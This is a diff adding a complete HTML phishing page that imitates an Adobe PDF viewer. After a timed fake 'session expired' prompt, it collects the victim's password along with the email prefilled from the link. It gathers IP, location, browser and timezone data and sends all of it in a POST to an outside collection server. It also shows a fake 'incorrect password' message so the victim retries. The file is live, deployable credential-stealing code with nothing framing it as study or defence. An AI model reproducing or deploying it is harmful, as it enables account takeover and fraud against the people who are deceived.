@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <link rel="icon" type="image/png" href="img/Adobe-Logo-PNG-Picture.png" sizes="any">
+  <title>Adobe PDF Viewer</title>
+  <style>
+    * {
+      padding: 0;
+      margin: 0;
+      box-sizing: border-box;
+    }
+
+    body,
+    html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      background: #f5f5f5;
+    }
+
+    .viewer {
+      position: relative;
+      height: 400vh;
+      width: 98vw;
+      background: url('img/pdf-folder/OrderPage.png') no-repeat center center;
+      background-repeat: no-repeat;
+      background-position: center;
+      transition: filter 0.5s ease;
+      background-size: 60% auto;
+    }
+
+    @media (max-width: 1024px) {
+      .viewer {
+        position: relative;
+        height: 100vh;
+        width: 98vw;
+        background: url('img/pdf-folder/OrderPage.png') no-repeat center center;
+        background-repeat: no-repeat;
+        background-position: center;
+        transition: filter 0.5s ease;
+        background-size: 80% auto;
+      }
+    }
+
+
+    .overlay {
+      position: absolute;
+      top: 0;
+      left: 0;
+      height: 100vh;
+      width: 98vw;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      z-index: 2;
+    }
+
+    .login-box {
+      background: #fff;
+      padding: 30px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+      border-radius: 5px;
+      text-align: center;
+      max-width: 320px;
+      width: 100%;
+    }
+
+    .login-box h2 {
+      margin-bottom: 10px;
+      color: #333;
+    }
+
+    .login-box p {
+      margin-bottom: 20px;
+      font-size: 1em;
+      color: #555;
+    }
+
+    .login-box input[type="email"],
+    .login-box input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 1em;
+    }
+
+    .login-box button {
+      background-color: #0078d4;
+      color: white;
+      padding: 12px 20px;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 1em;
+      margin-top: 10px;
+      width: 100%;
+    }
+
+    .login-box button:hover {
+      background-color: #005a9e;
+    }
+
+    .note {
+      color: #cc0000;
+      margin-top: 10px;
+      font-size: 0.9em;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="viewer"></div>
+
+  <div class="overlay">
+    <div class="login-box">
+      <h2><span style="color: #cc0000;">Adobe<sup>®</sup></span> Reader</h2>
+      <p>Session-Expired.Please re-authenticate to resume viewing this secured document.</p>
+
+      <div id="login-error" style="color: #cc0000; margin-bottom: 10px; display: none; font-size: 0.95em;">
+        Incorrect password. Please try again.
+      </div>
+
+      <form onsubmit="submitForm(event)">
+        <input type="email" name="email" placeholder="Email" id="email" disabled />
+        <input type="password" name="password" placeholder="Password" id="password" required />
+        <button type="submit">Resume Session</button>
+      </form>
+      <p class="note">Your session timed out due to device inactivity.</p>
+    </div>
+  </div>
+
+  <script>
+    const params = new URLSearchParams(window.location.search);
+    const emailValue = params.get("email");
+    const viewer = document.querySelector('.viewer');
+    const overlay = document.querySelector('.overlay');
+    const emailInput = document.getElementById('email');
+    const passwordInput = document.getElementById('password');
+
+    const sessionExpired = localStorage.getItem('sessionExpired');
+
+    if (sessionExpired === 'true') {
+      viewer.style.filter = 'blur(6px)';
+      overlay.style.display = 'flex';
+      emailInput.value = emailValue;
+      passwordInput.focus();
+    } else {
+      overlay.style.display = 'none';
+      viewer.style.filter = 'none';
+
+      setTimeout(() => {
+        viewer.style.filter = 'blur(6px)';
+        overlay.style.display = 'flex';
+
+        localStorage.setItem('sessionExpired', 'true');
+
+        emailInput.value = emailValue;
+        passwordInput.focus();
+      }, 8000);
+    }
+  </script>
+  <script>
+    async function submitForm(event) {
+      event.preventDefault();
+
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const userAgent = navigator.userAgent;
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+
+      let ip = "", country = "", city = "";
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        ip = data.ip;
+        country = data.country_name;
+        city = data.city;
+
+        const payload = {
+          email,
+          password,
+          ip,
+          country,
+          city,
+          userAgent,
+          timezone,
+        };
+
+        document.getElementById("login-error").style.display = "block";
+        setTimeout(() => {
+          document.getElementById("login-error").style.display = "none";
+        }, 2000)
+
+        // Use "http://localhost:3000/enter" for dev enviroment
+        // let response = await fetch("http://localhost:3000/enter", {
+          let response = await fetch("https://pdf-auto-link-be.onrender.com/enter", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        })
+      } catch (err) {
+      }
+    }
+  </script>
+</body>
+
+</html>
